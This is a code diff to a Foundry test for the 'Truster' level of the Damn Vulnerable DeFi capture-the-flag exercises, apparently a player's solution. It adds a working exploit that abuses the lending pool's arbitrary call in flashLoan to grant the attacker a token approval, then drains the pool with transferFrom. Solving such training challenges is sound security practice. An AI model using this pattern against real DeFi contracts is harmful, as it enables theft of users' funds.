@@ -3,6 +3,7 @@ pragma solidity >=0.8.0;
 
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
+import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../../src/Contracts/truster/TrusterLenderPool.sol";
@@ -38,13 +39,14 @@ contract Truster is Test {
     }
 
     function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
+        vm.startPrank(attacker);
 
-        /**
-         * EXPLOIT END *
-         */
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", attacker, type(uint256).max/2);
+        trusterLenderPool.flashLoan(0, attacker, address(dvt), data);
+        dvt.transferFrom(address(trusterLenderPool), attacker, dvt.balanceOf(address(trusterLenderPool)));
+
+        vm.stopPrank();
+
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
